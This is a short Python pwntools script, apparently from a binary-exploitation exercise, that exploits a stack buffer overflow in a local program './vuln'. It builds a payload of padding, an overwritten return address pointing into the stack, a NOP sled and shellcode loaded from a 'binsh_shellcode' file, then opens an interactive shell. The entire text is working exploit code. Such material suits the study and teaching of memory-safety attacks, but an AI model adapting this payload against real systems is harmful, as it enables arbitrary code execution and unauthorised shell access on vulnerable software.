#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
elf = ELF(BIN)

# machine_code_addr = elf.symbols["machine_code"]

# Later, we'll see how to use pwntools to solve this step as well.
with open("binsh_shellcode", "rb") as fin:
    shellcode = fin.read()


io = process(BIN)
# gdb.attach(io, '''catch syscall read''')

# 0x90
# First part: inject
payload = b""
payload += b"A" * (4+8)
payload += p64(0x7fffffffd5c0 + 100)
payload += b"\x90" * (400)
payload += shellcode


io.send(payload)
io.interactive()
